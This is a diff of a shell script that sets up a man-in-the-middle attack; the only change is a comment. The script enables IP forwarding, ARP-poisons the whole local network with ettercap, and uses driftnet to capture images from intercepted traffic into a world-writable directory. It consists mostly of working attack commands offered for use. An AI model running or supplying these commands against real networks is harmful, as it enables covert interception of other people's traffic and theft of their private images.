@@ -6,7 +6,7 @@ echo "$(tput bold)$(tput setaf 1)MITM initialize/enable port forwarding & make d
 sudo mkdir /mnt/localImages
 sudo chmod -R a+rwx /mnt/localImages # enable all read/write/execute permissions to external HDD. execute once only
 gif=$(find /mnt/localImages/ -type f -name "*.gif")
-sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for ARP poisoning
+sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding to reroute traffic for ARP poisoning
 sudo ettercap -T -Q -M arp -i eth0 // // &
 echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
 sudo driftnet -v -i eth0 -a -m 100 -d /mnt/localImages -x myImages & # save 100 images
